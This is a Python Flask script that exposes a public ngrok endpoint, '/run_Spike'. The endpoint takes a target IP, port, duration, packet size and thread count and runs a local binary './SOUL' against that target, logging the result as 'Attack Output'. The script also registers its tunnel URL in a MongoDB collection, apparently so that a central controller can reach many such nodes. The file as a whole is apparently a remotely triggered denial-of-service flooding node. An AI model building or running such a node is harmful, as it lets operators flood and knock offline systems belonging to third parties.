import os
import subprocess
from flask import Flask, request, jsonify
from pyngrok import ngrok
import pymongo

app = Flask(__name__)

# Read credentials from environment variables
MONGO_URI = os.environ.get("MONGO_URI")
NGROK_AUTH_TOKEN = os.environ.get("NGROK_AUTH_TOKEN")
USER_ID = os.environ.get("USER_ID", "default_user")  # fallback ID

# Connect to MongoDB
client = pymongo.MongoClient(MONGO_URI)
db = client["TEST"]
collection = db["ngrok_urls"]

# Set up ngrok
ngrok.set_auth_token(NGROK_AUTH_TOKEN)
public_url = ngrok.connect(6000).public_url
print(f" * ngrok tunnel \"{public_url}\" -> \"http://127.0.0.1:6000\"")

# Update or insert ngrok URL in MongoDB
existing_user = collection.find_one({"user_id": USER_ID})
if existing_user:
    collection.update_one(
        {"user_id": USER_ID}, 
        {"$set": {"ngrok_url": public_url.strip()}}
    )
    print(f"Updated ngrok URL for user ID: {USER_ID} to {public_url}")
else:
    collection.insert_one({"user_id": USER_ID, "ngrok_url": public_url.strip()})
    print(f"Saved new ngrok URL to MongoDB: {public_url} for user ID: {USER_ID}")

@app.route('/run_Spike', methods=['POST'])
def run_spike():
    data = request.get_json()
    ip = data.get("ip")
    port = data.get("port")
    duration = data.get("time")
    packet_size = data.get("packet_size")
    threads = data.get("threads")

    if not (ip and port and duration and packet_size and threads):
        return jsonify({"error": "Missing required parameters (ip, port, time, packet_size, threads)"}), 400

    try:
        result = subprocess.run(
            ["./SOUL", ip, str(port), str(duration), str(packet_size), str(threads)],
            capture_output=True, text=True
        )
        output = result.stdout
        error = result.stderr

        print(f"Attack Output: {output}")
        print(f"Attack Error: {error}")

        return jsonify({"output": output, "error": error})

    except Exception as e:
        return jsonify({"error": f"Failed to run SOUL: {str(e)}"}), 500

if __name__ == '__main__':
    print(f"Server running at public URL: {public_url}/run_Spike")
    app.run(port=6000)
